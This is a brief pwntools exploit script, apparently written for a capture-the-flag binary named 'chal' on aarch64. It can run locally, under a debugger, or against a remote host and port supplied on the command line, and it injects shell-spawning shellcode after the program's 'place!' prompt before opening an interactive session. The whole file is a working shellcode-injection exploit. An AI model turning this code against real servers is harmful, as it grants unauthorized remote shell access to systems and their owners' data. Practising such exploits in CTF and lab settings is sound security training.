from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
""".format(
    **locals()
)

exe = "./chal"
elf = context.binary = ELF(exe, checksec=False)
context.clear(arch="aarch64")
context.log_level = "critical"

io = start()

payload = asm(shellcraft.sh())

io.sendlineafter(b"place!\n", payload)

io.interactive()
